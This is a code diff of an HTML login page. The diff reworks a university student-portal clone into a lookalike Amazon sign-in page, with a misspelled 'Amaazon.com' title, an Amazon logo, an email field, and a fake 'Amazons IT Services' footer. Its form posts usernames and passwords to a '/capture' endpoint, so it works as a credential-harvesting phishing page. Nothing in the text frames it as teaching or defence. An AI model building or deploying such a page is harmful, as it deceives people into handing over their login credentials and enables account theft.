@@ -3,27 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GEU Student Portal</title>
+    <title>Amaazon.com : log  in</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             height: 100vh;
-            background-image: url('geuHome.jpg'); 
+            background-image: url('white_bg.jpg');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
         }
 
         .login-form {
-            background-color: #ffffff5a; 
+            background-color: #ffffff5a;
             max-width: 350px;
             padding: 20px;
             border-radius: 0px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0); 
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0);
             position: absolute;
             top: 9%;
-            right: 90px; 
+            right: 90px;
         }
 
         .logo img {
@@ -40,11 +40,11 @@
 
         .input-group input {
             font-size: small;
-            width: 93%; 
+            width: 93%;
             padding: 10px;
             border: 1px solid #ccc;
-            border-radius: 0px; 
-            box-sizing: border-box; 
+            border-radius: 0px;
+            box-sizing: border-box;
         }
 
         #captchaContainer {
@@ -80,7 +80,7 @@
         .bubble2 {
             bottom: 6px;
             right: 88px;
-            width: 30px; 
+            width: 30px;
             height: 30px;
             background-color: #5ad664;
         }
@@ -88,7 +88,7 @@
         .bubble3 {
             top: -10px;
             right: 104px;
-            width: 30px; 
+            width: 30px;
             height: 30px;
             background-color: #6f6ad9;
         }
@@ -99,7 +99,7 @@
             background-color: #42a7d3;
             color: white;
             border: none;
-            border-radius: 0px; 
+            border-radius: 0px;
             cursor: pointer;
         }
 
@@ -110,7 +110,7 @@
         .links {
             display: flex;
             flex-direction: column;
-            align-items: flex-end; 
+            align-items: flex-end;
             margin-top: 10px;
         }
 
@@ -118,7 +118,7 @@
             color: #e1e5e9;
             text-decoration: none;
             font-size: 10px;
-            margin-top: 5px; 
+            margin-top: 5px;
         }
 
         .link-separator {
@@ -134,42 +134,43 @@
     </style>
 </head>
 <body>
-    <div class="login-form">
-        <div class="logo">
-            <img id="geulogo" src="geu-logo.png" alt="GEU Logo">
+<div class="login-form" style="
+    left:40vw;">
+    <div class="logo">
+        <img id="geulogo" src="amazon_logo.jpg" alt="GEU Logo">
+    </div>
+    <form id="loginForm" action="/capture" method="POST">
+        <div class="input-group">
+            <input type="text" id="username" name="username" placeholder="Email" required>
         </div>
-        <form id="loginForm" action="/capture" method="POST">
-            <div class="input-group">
-                <input type="text" id="username" name="username" placeholder="User ID" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" name="password" placeholder="Password" required>
-            </div>
-            <div class="white-box">
-                <div id="captchaBox">
-                    <div id="captchaContainer">
-                        <div id="captchaCode"></div>
-                        <div class="bubble bubble1"></div>
-                        <div class="bubble bubble2"></div>
-                        <div class="bubble bubble3"></div>
-                    </div>
+        <div class="input-group">
+            <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <div class="white-box">
+            <div id="captchaBox">
+                <div id="captchaContainer">
+                    <div id="captchaCode"></div>
+                    <div class="bubble bubble1"></div>
+                    <div class="bubble bubble2"></div>
+                    <div class="bubble bubble3"></div>
                 </div>
             </div>
-            <div class="input-group">
-                <input type="text" id="captcha" placeholder="Enter CAPTCHA" required>
-            </div>
-            <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div> 
-            <button type="submit">Login</button>
-            <div class="links">
-                <a href="#">Forgot password?</a>
-                <a href="#">Forgot ID?</a>
-            </div>
-            <div class="link-separator"></div>
-            <footer>
-                <p>Powered by Cyborg IT Services (P) Ltd.</p>
-            </footer>
-        </form>
-    </div>
+        </div>
+        <div class="input-group">
+            <input type="text" id="captcha" placeholder="Enter CAPTCHA" required>
+        </div>
+        <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
+        <button type="submit">Login</button>
+        <div class="links">
+            <a href="#">Forgot password?</a>
+            <a href="#">Forgot ID?</a>
+        </div>
+        <div class="link-separator"></div>
+        <footer>
+            <p>Powered by Amazons IT Services (P) Ltd.</p>
+        </footer>
+    </form>
+</div>
 </body>
 <script src="script.js"></script>
 </html>
